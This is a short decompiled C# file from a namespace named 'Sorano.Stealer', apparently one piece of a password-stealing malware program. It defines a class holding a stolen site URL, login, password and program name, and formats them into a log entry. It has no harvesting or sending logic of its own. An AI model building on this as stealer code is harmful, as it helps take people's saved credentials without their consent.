using System;

namespace Sorano.Stealer
{
	// Token: 0x02000011 RID: 17
	public class PassData
	{
		// Token: 0x17000008 RID: 8
		// (get) Token: 0x06000025 RID: 37 RVA: 0x000020EA File Offset: 0x000002EA
		// (set) Token: 0x06000026 RID: 38 RVA: 0x000020F2 File Offset: 0x000002F2
		public string Url { get; set; }

		// Token: 0x17000009 RID: 9
		// (get) Token: 0x06000027 RID: 39 RVA: 0x000020FB File Offset: 0x000002FB
		// (set) Token: 0x06000028 RID: 40 RVA: 0x00002103 File Offset: 0x00000303
		public string Login { get; set; }

		// Token: 0x1700000A RID: 10
		// (get) Token: 0x06000029 RID: 41 RVA: 0x0000210C File Offset: 0x0000030C
		// (set) Token: 0x0600002A RID: 42 RVA: 0x00002114 File Offset: 0x00000314
		public string Password { get; set; }

		// Token: 0x1700000B RID: 11
		// (get) Token: 0x0600002B RID: 43 RVA: 0x0000211D File Offset: 0x0000031D
		// (set) Token: 0x0600002C RID: 44 RVA: 0x00002125 File Offset: 0x00000325
		public string Program { get; set; }

		// Token: 0x0600002D RID: 45 RVA: 0x00004300 File Offset: 0x00002500
		public override string ToString()
		{
			return string.Format("SiteUrl : {0}\r\nLogin : {1}\r\nPassword : {2}\r\nProgram : {3}\r\n——————————————————————————————————", new object[]
			{
				this.Url,
				this.Login,
				this.Password,
				this.Program
			});
		}
	}
}
